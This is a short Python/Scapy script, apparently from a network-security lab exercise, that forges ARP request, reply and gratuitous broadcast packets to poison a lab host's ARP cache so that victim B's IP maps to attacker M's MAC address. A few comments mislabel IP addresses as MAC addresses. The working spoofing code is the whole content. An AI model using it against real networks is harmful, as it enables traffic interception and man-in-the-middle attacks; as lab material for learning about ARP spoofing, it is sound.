#!/usr/bin/env python3
# For reply packets, there needs to B B in A's ARP cache already. telnet 10.9.0.6 or ping to cache.
from scapy.all import *
# '02:42:0a:09:00:69' # M's MAC addr
# '10.9.0.105'        # M's IP
# '02:42:0a:09:00:05' # A's MAC addr
# '10.9.0.5'          # A's MAC addr
# '02:42:0a:09:00:06' # B's MAC addr
# '10.9.0.6'          # B's MAC addr


E = Ether()
A = ARP()

# # Task 1.A: Send ARP req to map IP of B to MAC addr of M and send it to A
# A.op = 1     # 1 for ARP request; 2 for ARP reply
# E.dst='02:42:0a:09:00:05' # A's MAC addr, we are sending the packet to A
# E.src='02:42:0a:09:00:69' # M's MAC addr
# A.psrc='10.9.0.6'         # B's IP, spoofed 
# A.pdst='10.9.0.5'         # A's IP

# # Task 1.B ARP Reply
# A.op = 2     # 1 for ARP request; 2 for ARP reply
# E.dst='02:42:0a:09:00:05'   # A's MAC addr, we are sending the packet to A
# E.src='02:42:0a:09:00:69'   # M's MAC addr
# A.psrc='10.9.0.6'           # B's IP, spoofed 
# A.pdst='10.9.0.5'           # A's IP
# A.hwdst='02:42:0a:09:00:05' # A's MAC addr, by default is 0

# Task 1.C Gratuitous Packet pdst==psrc dst==hwdst==broadcast 
A.op = 1     # 1 for ARP request; 2 for ARP reply
E.dst='ff:ff:ff:ff:ff:ff'   # Broadcasting
E.src='02:42:0a:09:00:69'   # M's MAC addr
A.psrc='10.9.0.6'           # Gratuitous ARP Issuer's IP (B spoofed)
A.pdst='10.9.0.6'           # " " "
A.hwdst='ff:ff:ff:ff:ff:ff' # Broadcast

pkt = E/A
pkt.show()
sendp(pkt)